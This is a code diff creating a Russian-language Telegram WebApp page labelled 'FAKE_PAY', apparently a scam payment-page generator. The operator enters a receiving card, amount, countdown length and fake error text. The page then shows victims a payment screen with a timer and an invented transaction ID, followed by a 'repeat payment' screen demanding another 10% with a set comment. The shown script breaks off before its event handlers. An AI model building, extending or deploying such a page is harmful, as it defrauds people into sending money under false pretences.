@@ -1,57 +1,1193 @@
-<script>
-    // Добавляем обработку payment_id из URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const paymentId = urlParams.get('payment_id');
-    
-    // Модифицируем confirmBtn
-    document.getElementById('confirmBtn').addEventListener('click', async (e) => {
-        e.preventDefault();
-        
-        // Валидация
-        let cardNum = document.getElementById('cardNumber').value.trim().replace(/\s+/g, '');
-        if (cardNum.length < 13) {
-            alert('Введите корректный номер карты (минимум 13 цифр).');
-            return;
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment SBP</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-        if (document.getElementById('cardHolder').value.trim() === '') {
-            alert('Укажите имя владельца карты.');
-            return;
+
+        body {
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        /* Кнопка HOME в левом верхнем углу */
+        .home-button {
+            background: #eef2f6;
+            padding: 8px 20px;
+            border-radius: 20px;
+            color: #4a5f7e;
+            font-size: 15px;
+            font-weight: 600;
+            border: 1px solid #d0ddee;
+            cursor: pointer;
+            transition: 0.1s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+        }
+        .home-button:hover {
+            background: #e0e6f2;
+            border-color: #9aafcc;
+            color: #1f3a5e;
+        }
+
+        /* Основная карточка */
+        .card-panel {
+            width: 100%;
+            max-width: 520px;
+            background: white;
+            border-radius: 8px;
+            padding: 28px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.08), 0 3px 10px rgba(0,0,0,0.03);
+            border: 1px solid #e7ecf3;
+        }
+
+        /* ЭКРАН ВВОДА */
+        #inputScreen h2 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #14273e;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        #inputScreen h2 span {
+            background: #eaf1fb;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #1f4a9c;
+            border: 1px solid #c4d4e8;
+            font-weight: 500;
+        }
+        .label-row {
+            display: flex;
+            justify-content: space-between;
+            color: #475e7c;
+            font-size: 15px;
+            margin-top: 20px;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .input-field {
+            width: 100%;
+            background: #f9fbfe;
+            border: 1.5px solid #dbe2ec;
+            border-radius: 8px;
+            padding: 16px 20px;
+            font-size: 16px;
+            color: #121826;
+            outline: none;
+            transition: 0.15s;
+        }
+        .input-field:focus {
+            border-color: #2869e8;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(40,105,232,0.08);
+        }
+
+        /* Кнопка дополнительных функций */
+        .toggle-settings {
+            background: #eef2f6;
+            border: 1px solid #d0ddee;
+            border-radius: 20px;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1f3a5e;
+            cursor: pointer;
+            margin: 20px 0 10px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: 0.1s;
+        }
+        .toggle-settings:hover {
+            background: #e0e6f2;
+        }
+        .toggle-settings .arrow {
+            font-size: 18px;
+            transition: transform 0.2s;
+        }
+        .toggle-settings.open .arrow {
+            transform: rotate(180deg);
+        }
+
+        /* Блок дополнительных настроек */
+        .settings-panel {
+            display: none;
+            background: #f7fafd;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 10px;
+            border: 1px solid #dbe2ec;
+        }
+        .settings-panel.show {
+            display: block;
+        }
+
+        .confirm-btn {
+            background: #1a3f74;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 18px 28px;
+            font-size: 18px;
+            font-weight: 600;
+            width: 100%;
+            margin: 32px 0 12px 0;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 8px 18px rgba(26,63,116,0.15);
+            border: 1px solid #254f8a;
+        }
+        .confirm-btn:hover {
+            background: #235198;
+        }
+
+        /* ЭКРАН ПЛАТЕЖА */
+        .payment-screen {
+            display: none;
+        }
+
+        .timer-container {
+            background: #eef2f6;
+            border-radius: 20px;
+            padding: 8px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #d0ddee;
+            max-width: 480px;
+        }
+        .timer-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1f3a60;
+        }
+        .timer-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 24px;
+            font-weight: 700;
+            color: #14467e;
+            letter-spacing: 2px;
+        }
+
+        .payment-name {
+            font-size: 18px;
+            font-weight: 500;
+            color: #2f4a73;
+            background: #edf4fd;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            border: 1px solid #c9daf2;
+            word-break: break-word;
+        }
+
+        .large-amount {
+            font-size: 52px;
+            font-weight: 700;
+            color: #0c1e3f;
+            letter-spacing: -1px;
+            line-height: 1.1;
+            margin-bottom: 28px;
+            border-bottom: 1px solid #e2e9f2;
+            padding-bottom: 20px;
+        }
+
+        .detail-row {
+            display: flex;
+            align-items: baseline;
+            padding: 12px 0;
+            border-bottom: 1px solid #edf2f8;
+        }
+        .detail-label {
+            width: 130px;
+            color: #5d718d;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .detail-value {
+            flex: 1;
+            color: #121f35;
+            font-size: 16px;
+            font-weight: 500;
+            word-break: break-word;
+            text-align: left;
+        }
+        .detail-value.mono {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 17px;
+            letter-spacing: 0.2px;
+        }
+
+        .copy-row {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 6px;
+            margin-bottom: 10px;
+        }
+        .copy-btn {
+            background: #eef2f6;
+            border: 1px solid #bcc9dc;
+            border-radius: 20px;
+            padding: 8px 20px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #3a4f6e;
+            cursor: pointer;
+            transition: 0.1s;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+        }
+        .copy-btn:hover {
+            background: #e0e6f0;
+            border-color: #9aafcc;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .pay-button {
+            background: #1a5f3e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: 600;
+            flex: 1;
+            cursor: pointer;
+            transition: 0.15s;
+            border: 1px solid #0f4a2f;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .pay-button:hover {
+            background: #218c4e;
+        }
+        .cancel-button {
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: 600;
+            flex: 1;
+            cursor: pointer;
+            transition: 0.15s;
+            border: 1px solid #b11f2e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .cancel-button:hover {
+            background: #c82333;
+        }
+
+        .footnote {
+            color: #6f89aa;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-top: 20px;
+            background: #f7fafd;
+            padding: 16px;
+            border-radius: 6px;
+            border: 1px solid #e1eaf3;
+        }
+
+        .id-row {
+            background: #f4f8fe;
+            padding: 14px 16px;
+            border-radius: 6px;
+            margin: 16px 0 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 15px;
+            color: #1d3d6b;
+            border: 1px solid #d2e0f0;
+            word-break: break-all;
+        }
+        .id-label {
+            font-size: 13px;
+            color: #547197;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
+
+        /* Модальное окно для ошибки */
+        .custom-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.15s;
+        }
+        .custom-modal.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .custom-modal .modal-content {
+            background: white;
+            border-radius: 12px;
+            max-width: 340px;
+            width: 90%;
+            padding: 28px 22px;
+            text-align: center;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            border: 1px solid #dee2e9;
+        }
+        .custom-modal .big-icon {
+            font-size: 64px;
+            line-height: 1;
+            margin-bottom: 12px;
+            color: #b02a37;
+        }
+        .custom-modal h3 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2a3f;
+            margin-bottom: 10px;
+        }
+        .custom-modal p {
+            font-size: 16px;
+            color: #435574;
+            margin-bottom: 24px;
+            white-space: pre-line;
+        }
+        .custom-modal .modal-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 30px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            border: 1px solid #b11f2e;
+        }
+        .custom-modal .modal-btn:hover {
+            background: #c12a3a;
+        }
+
+        /* Модальное окно успеха (с галочкой) */
+        .success-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.15s;
+        }
+        .success-modal.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .success-modal .modal-content {
+            background: white;
+            border-radius: 12px;
+            max-width: 340px;
+            width: 90%;
+            padding: 28px 22px;
+            text-align: center;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            border: 1px solid #dee2e9;
+        }
+        .success-modal .big-icon {
+            font-size: 64px;
+            line-height: 1;
+            margin-bottom: 12px;
+            color: #1a5f3e;
+        }
+        .success-modal h3 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2a3f;
+            margin-bottom: 10px;
+        }
+        .success-modal p {
+            font-size: 16px;
+            color: #435574;
+            margin-bottom: 24px;
+        }
+        .success-modal .modal-btn {
+            background: #1a5f3e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 30px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            border: 1px solid #0f4a2f;
+        }
+        .success-modal .modal-btn:hover {
+            background: #218c4e;
+        }
+
+        /* Модальное окно истечения времени */
+        .timeout-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.15s;
+        }
+        .timeout-modal.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .timeout-modal .modal-content {
+            background: white;
+            border-radius: 12px;
+            max-width: 340px;
+            width: 90%;
+            padding: 28px 22px;
+            text-align: center;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            border: 1px solid #dee2e9;
+        }
+
+        /* Страница повторного платежа */
+        .repeat-screen {
+            display: none;
+            width: 100%;
+            max-width: 520px;
+        }
+        .repeat-card {
+            background: white;
+            border-radius: 8px;
+            padding: 28px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.08), 0 3px 10px rgba(0,0,0,0.03);
+            border: 1px solid #e7ecf3;
+        }
+        .repeat-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #b02a37;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .repeat-amount {
+            font-size: 48px;
+            font-weight: 700;
+            color: #0c1e3f;
+            margin: 20px 0;
+        }
+        .repeat-warning {
+            background: #fff3cd;
+            border-left: 6px solid #ffc107;
+            padding: 16px;
+            border-radius: 6px;
+            margin: 20px 0;
+            color: #856404;
+        }
+        .repeat-comment {
+            background: #f7fafd;
+            padding: 16px;
+            border-radius: 6px;
+            margin: 20px 0;
+            border: 1px solid #dbe2ec;
+            font-style: italic;
+        }
+        .repeat-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+        .repeat-pay-btn {
+            background: #1a5f3e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: 600;
+            flex: 1;
+            cursor: pointer;
+        }
+        .repeat-cancel-btn {
+            background: #6c757d;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: 600;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        /* Индикатор загрузки */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+        }
+        .loading-overlay.show {
+            display: flex;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1a3f74;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #1a3f74;
+            font-size: 18px;
+            font-weight: 600;
         }
         
-        // Собираем данные
-        const paymentData = {
-            payment_id: paymentId,
-            card_number: document.getElementById('cardNumber').value.trim(),
-            card_holder: document.getElementById('cardHolder').value.trim(),
-            bank_name: document.getElementById('bankName').value.trim() || 'Не указан',
-            amount: document.getElementById('amount').value.trim() || '0 ₽',
-            payment_name: document.getElementById('paymentName').value.trim() || 'Оплата'
-        };
-        
-        try {
-            // Отправляем данные в бота через Telegram WebApp
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.sendData(JSON.stringify(paymentData));
-                Telegram.WebApp.close();
-            } else {
-                // Для тестирования вне Telegram
-                alert('Данные для отправки: ' + JSON.stringify(paymentData, null, 2));
+        /* Payment ID display */
+        .payment-id-info {
+            margin-top: 10px;
+            padding: 10px;
+            background: #eef2f6;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <!-- Кнопка HOME -->
+    <div class="home-button" id="homeButton">HOME</div>
+
+    <!-- Индикатор загрузки -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Отправка данных...</div>
+    </div>
+
+    <!-- Модалка истечения времени -->
+    <div class="timeout-modal" id="timeoutModal">
+        <div class="modal-content">
+            <div class="big-icon">✕</div>
+            <h3>Операция отклонена</h3>
+            <p>Время истекло. Платёж не был завершён.</p>
+            <button class="modal-btn" id="closeTimeoutBtn">Продолжить</button>
+        </div>
+    </div>
+
+    <!-- Модалка для ошибки -->
+    <div class="custom-modal" id="customErrorModal">
+        <div class="modal-content">
+            <div class="big-icon">✕</div>
+            <h3 id="errorModalTitle">Ошибка</h3>
+            <p id="errorModalMessage">Произошла ошибка</p>
+            <button class="modal-btn" id="errorModalBtn">Продолжить</button>
+        </div>
+    </div>
+
+    <!-- Модалка для успеха -->
+    <div class="success-modal" id="successModal">
+        <div class="modal-content">
+            <div class="big-icon">✓</div>
+            <h3>Успешная оплата</h3>
+            <p>Платёж выполнен успешно</p>
+            <button class="modal-btn" id="successModalBtn">Закрыть</button>
+        </div>
+    </div>
+
+    <!-- Основной контейнер -->
+    <div id="appContainer">
+        <!-- ЭКРАН ВВОДА -->
+        <div class="card-panel" id="inputScreen">
+            <h2>💳 FAKE_PAY@ton_ultra <span>PRIVATE CODE</span></h2>
+            <div style="color:#4f658d; margin-bottom: 20px;">Введите данные для платежа</div>
+
+            <div class="label-row">
+                <span>Номер карты</span>
+                <span style="color:#6e85aa;">16 цифр</span>
+            </div>
+            <input type="text" class="input-field" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric">
+
+            <div class="label-row" style="margin-top: 18px;">
+                <span>Держатель</span>
+                <span style="color:#6e85aa;">имя и фамилия</span>
+            </div>
+            <input type="text" class="input-field" id="cardHolder" placeholder="Vasya Pupkin">
+
+            <div class="label-row" style="margin-top: 18px;">Банк</div>
+            <input type="text" class="input-field" id="bankName" placeholder="Т-Банк, Сбер, Альфа, OZON">
+
+            <div class="label-row" style="margin-top: 18px;">Сумма</div>
+            <input type="text" class="input-field" id="amount" placeholder="1 000 ₽" value="1 000 ₽">
+
+            <!-- Кнопка дополнительных функций -->
+            <div class="toggle-settings" id="toggleSettings">
+                <span>⚙️ Дополнительные функции</span>
+                <span class="arrow">▼</span>
+            </div>
+
+            <!-- Блок настроек -->
+            <div class="settings-panel" id="settingsPanel">
+                <div class="label-row">Название платежа</div>
+                <input type="text" class="input-field" id="paymentName" placeholder="Например: Перевод другу" value="Оплата">
+
+                <div class="label-row" style="margin-top: 18px;">Время таймера (минуты)</div>
+                <input type="number" class="input-field" id="timerMinutes" placeholder="7" value="7" min="1" max="60">
+
+                <div class="label-row" style="margin-top: 18px;">Текст ошибки</div>
+                <input type="text" class="input-field" id="errorMessageText" placeholder="Текст ошибки" value="Взять из pay_fake_err.txt">
+
+                <div class="label-row" style="margin-top: 18px;">Заголовок ошибки</div>
+                <input type="text" class="input-field" id="errorTitleText" placeholder="Заголовок" value="Ошибка оплаты">
+
+                <!-- Новое поле: комментарий для повторного платежа -->
+                <div class="label-row" style="margin-top: 18px;">Комментарий (для повторного платежа)</div>
+                <input type="text" class="input-field" id="repeatCommentText" placeholder="Комментарий" value="Тм1 ознакомтесь с pay_fake_err.txt">
+            </div>
+
+            <button class="confirm-btn" id="confirmBtn">✓ CONFIRM AND GENERATE</button>
+            
+            <!-- Здесь будет отображаться ID платежа -->
+            <div id="paymentIdDisplay" class="payment-id-info"></div>
+        </div>
+
+        <!-- ЭКРАН ПЛАТЕЖА -->
+        <div class="card-panel payment-screen" id="paymentScreen">
+            <div class="timer-container">
+                <span class="timer-label">Осталось</span>
+                <span class="timer-value" id="timerDisplay">12:00</span>
+            </div>
+
+            <div class="payment-name" id="displayPaymentName">Оплата</div>
+            
+            <div class="large-amount" id="displayAmount">1 000 ₽</div>
+
+            <div class="detail-row">
+                <span class="detail-label">Номер карты</span>
+                <span class="detail-value mono" id="displayCard">1234 5678 9012 3456</span>
+            </div>
+            <div class="copy-row">
+                <button class="copy-btn" id="copyCardBtn">COPY</button>
+            </div>
+
+            <div class="detail-row">
+                <span class="detail-label">Банк</span>
+                <span class="detail-value" id="displayBank">БАНК</span>
+            </div>
+
+            <div class="detail-row">
+                <span class="detail-label">Владелец</span>
+                <span class="detail-value" id="displayHolder">Вася Пупкин</span>
+            </div>
+
+            <div class="id-row">
+                <div class="id-label">Номер транзакции</div>
+                <span id="transactionId">23e74999280b40549550a614b594acb1</span>
+            </div>
+
+            <div class="action-buttons">
+                <button class="pay-button" id="payConfirmedBtn">Я оплатил</button>
+                <button class="cancel-button" id="cancelPaymentBtn">Отменить</button>
+            </div>
+
+            <div class="footnote">
+                Указанную сумму <span id="footnoteAmount">67 ₽</span> переведите точно на карту банка <span id="footnoteBank">БАНК</span>.
+            </div>
+        </div>
+
+        <!-- ЭКРАН ПОВТОРНОГО ПЛАТЕЖА -->
+        <div class="repeat-screen" id="repeatScreen">
+            <div class="repeat-card">
+                <div class="repeat-title">
+                    <span>⚠️</span> Внимание!
+                </div>
+                
+                <div class="repeat-amount" id="repeatAmount">1 000 ₽</div>
+
+                <div class="repeat-warning">
+                    <strong>Будьте внимательны!</strong> Это повторный платёж.
+                </div>
+
+                <div class="repeat-comment" id="repeatComment">
+                    Оставьте комментарий: "Тм1 ознакомтесь с pay_fake_err.txt", если вы не оставите его, платеж может быть не найден вовсе.
+                </div>
+
+                <div class="repeat-buttons">
+                    <button class="repeat-pay-btn" id="repeatPayBtn">Оплатить</button>
+                    <button class="repeat-cancel-btn" id="repeatCancelBtn">Отмена</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Инициализация Telegram WebApp
+            const tg = window.Telegram ? Telegram.WebApp : null;
+            if (tg) {
+                tg.expand(); // Разворачиваем на весь экран
+                tg.ready(); // Сообщаем, что приложение готово
+                console.log('Telegram WebApp initialized');
             }
-        } catch (error) {
-            alert('Ошибка при отправке данных: ' + error.message);
-        }
-    });
-    
-    // Показываем payment_id если есть
-    if (paymentId) {
-        const paymentIdDisplay = document.createElement('div');
-        paymentIdDisplay.style.marginTop = '10px';
-        paymentIdDisplay.style.padding = '10px';
-        paymentIdDisplay.style.background = '#eef2f6';
-        paymentIdDisplay.style.borderRadius = '4px';
-        paymentIdDisplay.style.fontSize = '12px';
-        paymentIdDisplay.style.color = '#666';
-        paymentIdDisplay.textContent = 'ID платежа: ' + paymentId;
-        document.querySelector('.card-panel').insertBefore(paymentIdDisplay, document.querySelector('.confirm-btn'));
-    }
-</script>
+
+            // Экраны
+            const inputScreen = document.getElementById('inputScreen');
+            const paymentScreen = document.getElementById('paymentScreen');
+            const repeatScreen = document.getElementById('repeatScreen');
+            const timeoutModal = document.getElementById('timeoutModal');
+            const closeTimeoutBtn = document.getElementById('closeTimeoutBtn');
+            const homeButton = document.getElementById('homeButton');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+
+            // Модалки
+            const customModal = document.getElementById('customErrorModal');
+            const errorModalBtn = document.getElementById('errorModalBtn');
+            const errorModalTitle = document.getElementById('errorModalTitle');
+            const errorModalMessage = document.getElementById('errorModalMessage');
+            
+            const successModal = document.getElementById('successModal');
+            const successModalBtn = document.getElementById('successModalBtn');
+
+            // Элементы повторного платежа
+            const repeatAmount = document.getElementById('repeatAmount');
+            const repeatComment = document.getElementById('repeatComment');
+            const repeatPayBtn = document.getElementById('repeatPayBtn');
+            const repeatCancelBtn = document.getElementById('repeatCancelBtn');
+
+            // Поля ввода
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardHolderInput = document.getElementById('cardHolder');
+            const bankNameInput = document.getElementById('bankName');
+            const amountInput = document.getElementById('amount');
+            const paymentNameInput = document.getElementById('paymentName');
+            const timerMinutesInput = document.getElementById('timerMinutes');
+            const errorMessageInput = document.getElementById('errorMessageText');
+            const errorTitleInput = document.getElementById('errorTitleText');
+            const repeatCommentInput = document.getElementById('repeatCommentText');
+            const paymentIdDisplay = document.getElementById('paymentIdDisplay');
+
+            // Кнопки
+            const confirmBtn = document.getElementById('confirmBtn');
+            const payConfirmedBtn = document.getElementById('payConfirmedBtn');
+            const cancelPaymentBtn = document.getElementById('cancelPaymentBtn');
+            const copyCardBtn = document.getElementById('copyCardBtn');
+            const toggleSettings = document.getElementById('toggleSettings');
+            const settingsPanel = document.getElementById('settingsPanel');
+
+            // Элементы платежного экрана
+            const displayPaymentName = document.getElementById('displayPaymentName');
+            const displayAmount = document.getElementById('displayAmount');
+            const displayCard = document.getElementById('displayCard');
+            const displayBank = document.getElementById('displayBank');
+            const displayHolder = document.getElementById('displayHolder');
+            const transactionSpan = document.getElementById('transactionId');
+            const footnoteAmount = document.getElementById('footnoteAmount');
+            const footnoteBank = document.getElementById('footnoteBank');
+            const timerDisplay = document.getElementById('timerDisplay');
+
+            // Получаем payment_id из URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const paymentId = urlParams.get('payment_id');
+            
+            // Отображаем payment_id если есть
+            if (paymentId) {
+                paymentIdDisplay.textContent = 'ID платежа: ' + paymentId;
+            }
+
+            // Сохраняем данные для повторного платежа
+            let lastPaymentData = {
+                amount: 0,
+                amountText: '',
+                card: '',
+                bank: '',
+                holder: '',
+                errorText: '',
+                paymentName: '',
+                repeatComment: ''
+            };
+
+            // Таймер
+            let timerInterval = null;
+            let timeLeftSeconds = 720;
+            let timerActive = false;
+
+            function formatTime(seconds) {
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            }
+
+            function updateTimerDisplay() {
+                timerDisplay.textContent = formatTime(timeLeftSeconds);
+            }
+
+            function stopTimer() {
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+                timerActive = false;
+            }
+
+            function startTimer() {
+                stopTimer();
+                updateTimerDisplay();
+                timerActive = true;
+
+                timerInterval = setInterval(() => {
+                    if (timeLeftSeconds <= 1) {
+                        timeLeftSeconds = 0;
+                        updateTimerDisplay();
+                        stopTimer();
+                        showTimeoutModal();
+                    } else {
+                        timeLeftSeconds--;
+                        updateTimerDisplay();
+                    }
+                }, 1000);
+            }
+
+            function generateRandomId() {
+                const chars = '0123456789abcdef';
+                let result = '';
+                for (let i = 0; i < 32; i++) {
+                    result += chars[Math.floor(Math.random() * 16)];
+                }
+                return result;
+            }
+
+            // Переход на экран оплаты
+            function switchToPaymentScreen() {
+                let rawCard = cardNumberInput.value.trim();
+                if (rawCard === '') rawCard = '**** **** **** ****';
+                let digitsOnly = rawCard.replace(/\s+/g, '');
+                let formattedCard = '';
+                for (let i = 0; i < digitsOnly.length; i++) {
+                    if (i > 0 && i % 4 === 0) formattedCard += ' ';
+                    formattedCard += digitsOnly[i];
+                }
+                if (formattedCard === '') formattedCard = rawCard;
+
+                const holder = cardHolderInput.value.trim() || 'Не указан';
+                const bank = bankNameInput.value.trim() || 'Не указан';
+                let amountValue = amountInput.value.trim();
+                if (amountValue === '') amountValue = '—';
+                
+                let paymentName = paymentNameInput.value.trim();
+                if (paymentName === '') paymentName = 'Перевод';
+
+                // Сохраняем данные для повторного платежа
+                let numericAmount = parseFloat(amountValue.replace(/[^\d,.]/g, '').replace(',', '.'));
+                if (isNaN(numericAmount)) numericAmount = 10000;
+                
+                lastPaymentData = {
+                    amount: numericAmount,
+                    amountText: amountValue,
+                    card: formattedCard,
+                    bank: bank,
+                    holder: holder,
+                    errorText: errorMessageInput.value.trim() || 'Ошибка при оплате',
+                    paymentName: paymentName,
+                    repeatComment: repeatCommentInput.value.trim() || 'Возврат средств'
+                };
+
+                displayPaymentName.textContent = paymentName;
+                displayAmount.textContent = amountValue;
+                displayCard.textContent = formattedCard;
+                displayBank.textContent = bank;
+                displayHolder.textContent = holder;
+                footnoteAmount.textContent = amountValue;
+                footnoteBank.textContent = bank;
+
+                transactionSpan.textContent = generateRandomId();
+
+                let minutes = parseInt(timerMinutesInput.value);
+                if (isNaN(minutes) || minutes < 1) minutes = 12;
+                if (minutes > 60) minutes = 60;
+                timeLeftSeconds = minutes * 60;
+                updateTimerDisplay();
+
+                inputScreen.style.display = 'none';
+                paymentScreen.style.display = 'block';
+                repeatScreen.style.display = 'none';
+
+                startTimer();
+            }
+
+            function showInputScreen() {
+                stopTimer();
+                inputScreen.style.display = 'block';
+                paymentScreen.style.display = 'none';
+                repeatScreen.style.display = 'none';
+                hideTimeoutModal();
+                hideCustomModal();
+                hideSuccessModal();
+            }
+
+            function showRepeatScreen() {
+                stopTimer();
+                
+                // Рассчитываем 10% от суммы
+                let tenPercent = (lastPaymentData.amount * 0.1).toFixed(2);
+                let tenPercentFormatted = new Intl.NumberFormat('ru-RU', {
+                    style: 'currency',
+                    currency: 'RUB',
+                    minimumFractionDigits: 0,
+                    maximumFractionDigits: 0
+                }).format(tenPercent);
+                
+                repeatAmount.textContent = tenPercentFormatted;
+                repeatComment.textContent = `Оставьте комментарий: "${lastPaymentData.repeatComment}", если вы не оставите его, платеж может быть не найден вовсе.`;
+                
+                inputScreen.style.display = 'none';
+                paymentScreen.style.display = 'none';
+                repeatScreen.style.display = 'block';
+            }
+
+            function validateAndProceed() {
+                let cardNum = cardNumberInput.value.trim().replace(/\s+/g, '');
+                if (cardNum.length < 13) {
+                    alert('Введите корректный номер карты (минимум 13 цифр).');
+                    return false;
+                }
+                if (cardHolderInput.value.trim() === '') {
+                    alert('Укажите имя владельца карты.');
+                    return false;
+                }
+                
+                // Если есть payment_id, отправляем данные в Telegram
+                if (paymentId && tg) {
+                    sendPaymentData();
+                } else {
+                    // Иначе просто переходим на экран оплаты
+                    switchToPaymentScreen();
+                }
+                return true;
+            }
+
+            function sendPaymentData() {
+                // Показываем загрузку
+                loadingOverlay.classList.add('show');
+                
+                // Собираем данные
+                const paymentData = {
+                    payment_id: paymentId,
+                    card_number: cardNumberInput.value.trim(),
+                    card_holder: cardHolderInput.value.trim(),
+                    bank_name: bankNameInput.value.trim() || 'Не указан',
+                    amount: amountInput.value.trim() || '0 ₽',
+                    payment_name: paymentNameInput.value.trim() || 'Оплата'
+                };
+                
+                console.log('Sending payment data:', paymentData);
+                
+                try {
+                    // Отправляем данные в бота через Telegram WebApp
+                    if (tg) {
+                        tg.sendData(JSON.stringify(paymentData));
+                        // Не закрываем сразу, даем время на отправку
+                        setTimeout(() => {
+                            loadingOverlay.classList.remove('show');
+                            tg.close();
+                        }, 1000);
+                    } else {
+                        loadingOverlay.classList.remove('show');
+                        alert('Данные для отправки: ' + JSON.stringify(paymentData, null, 2));
+                        switchToPaymentScreen();
+                    }
+                } catch (error) {
+                    loadingOverlay.classList.remove('show');
+                    alert('Ошибка при отправке данных: ' + error.message);
+                    console.error('Send error:', error);
+                }
+            }
+
+            function showTimeoutModal() {
+                timeoutModal.classList.add('show');
+            }
+
+            function hideTimeoutModal() {
+                timeoutModal.classList.remove('show');
+            }
+
+            function showCustomModal() {
+                customModal.classList.add('show');
+            }
+
+            function hideCustomModal() {
+                customModal.classList.remove('show');
+            }
+
+            function showSuccessModal() {
+                successModal.classList.add('show');
+            }
+
+            function hideSuccessModal() {
+                successModal.classList.remove('show');
+            }
+
+            // Обработчики
